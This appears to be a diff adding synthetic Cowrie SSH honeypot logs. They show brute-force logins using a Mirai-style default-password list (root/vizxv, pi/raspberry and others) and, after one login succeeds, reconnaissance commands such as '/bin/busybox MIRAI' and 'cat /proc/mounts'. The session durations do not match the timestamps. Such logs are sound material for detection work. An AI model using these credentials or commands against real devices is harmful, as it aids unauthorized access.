+{"eventid":"cowrie.session.connect","session":"5d2de11cf6ed","src_ip":"203.0.113.44","timestamp":"2026-08-16T09:55:04.000Z","sensor":"honeypot","src_port":36444,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"5d2de11cf6ed","src_ip":"203.0.113.44","timestamp":"2026-08-16T09:55:04.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.9.0"}
+{"eventid":"cowrie.login.success","session":"5d2de11cf6ed","src_ip":"203.0.113.44","timestamp":"2026-08-16T09:55:05.000Z","sensor":"honeypot","username":"admin","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"5d2de11cf6ed","src_ip":"203.0.113.44","timestamp":"2026-08-16T09:55:06.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.login.failed","session":"5d2de11cf6ed","src_ip":"203.0.113.44","timestamp":"2026-08-16T09:55:07.000Z","sensor":"honeypot","username":"root","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"5d2de11cf6ed","src_ip":"203.0.113.44","timestamp":"2026-08-16T09:55:08.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"5d2de11cf6ed","src_ip":"203.0.113.44","timestamp":"2026-08-16T09:55:09.000Z","sensor":"honeypot","username":"root","password":"888888"}
+{"eventid":"cowrie.session.closed","session":"5d2de11cf6ed","src_ip":"203.0.113.44","timestamp":"2026-08-16T09:55:26.000Z","sensor":"honeypot","duration":39.61}
+{"eventid":"cowrie.session.connect","session":"d1e73e95a614","src_ip":"203.0.113.44","timestamp":"2026-08-16T13:07:59.000Z","sensor":"honeypot","src_port":14979,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"d1e73e95a614","src_ip":"203.0.113.44","timestamp":"2026-08-16T13:07:59.120Z","sensor":"honeypot","version":"SSH-2.0-PUTTY"}
+{"eventid":"cowrie.login.failed","session":"d1e73e95a614","src_ip":"203.0.113.44","timestamp":"2026-08-16T13:08:00.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.session.closed","session":"d1e73e95a614","src_ip":"203.0.113.44","timestamp":"2026-08-16T13:08:36.000Z","sensor":"honeypot","duration":11.14}
+{"eventid":"cowrie.session.connect","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:22.000Z","sensor":"honeypot","src_port":20910,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:22.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.10.0"}
+{"eventid":"cowrie.login.failed","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:23.000Z","sensor":"honeypot","username":"root","password":"juantech"}
+{"eventid":"cowrie.login.failed","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:24.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.login.success","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:25.000Z","sensor":"honeypot","username":"root","password":"admin"}
+{"eventid":"cowrie.login.failed","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:26.000Z","sensor":"honeypot","username":"root","password":"vizxv"}
+{"eventid":"cowrie.login.failed","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:27.000Z","sensor":"honeypot","username":"root","password":"1234"}
+{"eventid":"cowrie.login.failed","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:28.000Z","sensor":"honeypot","username":"root","password":""}
+{"eventid":"cowrie.command.input","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:28.000Z","sensor":"honeypot","input":"/bin/busybox MIRAI"}
+{"eventid":"cowrie.command.input","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:29.000Z","sensor":"honeypot","input":"uname -a"}
+{"eventid":"cowrie.command.input","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:32.000Z","sensor":"honeypot","input":"cat /proc/cpuinfo | grep name | head -n 1"}
+{"eventid":"cowrie.command.input","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:21:34.000Z","sensor":"honeypot","input":"cat /proc/mounts"}
+{"eventid":"cowrie.session.closed","session":"a1739ee4a085","src_ip":"203.0.113.44","timestamp":"2026-08-16T16:22:04.000Z","sensor":"honeypot","duration":25.78}
+{"eventid":"cowrie.session.connect","session":"8d62b55d0404","src_ip":"198.51.100.140","timestamp":"2026-08-16T16:27:16.000Z","sensor":"honeypot","src_port":1162,"dst_port":22,"protocol":"ssh"}
+{"eventid":"cowrie.client.version","session":"8d62b55d0404","src_ip":"198.51.100.140","timestamp":"2026-08-16T16:27:16.120Z","sensor":"honeypot","version":"SSH-2.0-libssh2_1.10.0"}
+{"eventid":"cowrie.login.failed","session":"8d62b55d0404","src_ip":"198.51.100.140","timestamp":"2026-08-16T16:27:17.000Z","sensor":"honeypot","username":"root","password":"54321"}
+{"eventid":"cowrie.login.failed","session":"8d62b55d0404","src_ip":"198.51.100.140","timestamp":"2026-08-16T16:27:18.000Z","sensor":"honeypot","username":"admin","password":"password"}
+{"eventid":"cowrie.login.failed","session":"8d62b55d0404","src_ip":"198.51.100.140","timestamp":"2026-08-16T16:27:19.000Z","sensor":"honeypot","username":"pi","password":"raspberry"}
+{"eventid":"cowrie.session.closed","session":"8d62b55d0404","src_ip":"198.51.100.140","timestamp":"2026-08-16T16:27:56.000Z","sensor":"honeypot","duration":44.76}
